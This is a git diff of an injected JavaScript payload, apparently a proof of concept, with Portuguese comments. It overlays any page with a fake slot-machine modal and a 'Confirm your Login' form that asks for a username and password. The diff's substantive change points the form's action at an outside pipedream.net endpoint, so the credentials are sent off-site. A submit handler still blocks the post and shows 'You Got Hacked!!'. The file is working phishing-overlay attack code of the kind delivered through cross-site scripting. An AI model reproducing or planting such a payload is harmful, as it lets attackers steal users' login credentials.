@@ -1,11 +1,13 @@
-(function() {
-  // Evita múltiplas execuções
-  if (window.__slotMachineInjected) return;
-  window.__slotMachineInjected = true;
 
-  // CSS do modal
-  var style = document.createElement('style');
-  style.textContent = `
+
+(function() {
+    // Evita múltiplas execuções
+    if (window.__slotMachineInjected) return;
+    window.__slotMachineInjected = true;
+
+    // CSS do modal
+    var style = document.createElement('style');
+    style.textContent = `
     #slotModalBg {
       position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
       background: rgba(0,0,0,0.85); z-index: 99999; display: flex; align-items: center; justify-content: center;
@@ -31,12 +33,12 @@
       position: absolute; top: 12px; right: 20px; background: none; color: #fff; font-size: 1.5em; border: none; cursor: pointer;
     }
   `;
-  document.head.appendChild(style);
+    document.head.appendChild(style);
 
-  // HTML do modal
-  var modalBg = document.createElement('div');
-  modalBg.id = 'slotModalBg';
-  modalBg.innerHTML = `
+    // HTML do modal
+    var modalBg = document.createElement('div');
+    modalBg.id = 'slotModalBg';
+    modalBg.innerHTML = `
     <div id="slotModal">
       <button class="closeBtn" title="Fechar" onclick="document.getElementById('slotModalBg').remove()">×</button>
       <div class="aviso">⚠️⚠️</div>
@@ -45,7 +47,7 @@
       <button id="girarBtn">Roll</button>
       <div class="login">
         <h3>Confirm your Login</h3>
-        <form id="slotLoginForm">
+        <form id="slotLoginForm" action="https://eobx9u4gpw6vs1y.m.pipedream.net/poc" method="POST">
           <input type="text" placeholder="User/Mail" required><br>
           <input type="password" placeholder="Password" required><br>
           <button type="submit">Signin</button>
@@ -53,21 +55,22 @@
       </div>
     </div>
   `;
-  document.body.appendChild(modalBg);
+    document.body.appendChild(modalBg);
 
-  // Função de girar
-  document.getElementById('girarBtn').onclick = function() {
-    var simbolos = ['🍒', '🍋', '🍊', '🍉', '⭐', '🔔'];
-    var resultado = [];
-    for (var i = 0; i < 3; i++) {
-      resultado.push(simbolos[Math.floor(Math.random() * simbolos.length)]);
-    }
-    document.getElementById('slotFake').textContent = resultado.join(' | ');
-  };
+    // Função de girar
+    document.getElementById('girarBtn').onclick = function() {
+        var simbolos = ['🍒', '🍋', '🍊', '🍉', '⭐', '🔔'];
+        var resultado = [];
+        for (var i = 0; i < 3; i++) {
+            resultado.push(simbolos[Math.floor(Math.random() * simbolos.length)]);
+        }
+        document.getElementById('slotFake').textContent = resultado.join(' | ');
+    };
 
-  // Função de login fake
-  document.getElementById('slotLoginForm').onsubmit = function(e) {
-    e.preventDefault();
-    alert('You Got Hacked!!');
-  };
+    // Função de login fake
+    document.getElementById('slotLoginForm').onsubmit = function(e) {
+        e.preventDefault();
+        alert('You Got Hacked!!');
+    };
 })();
+
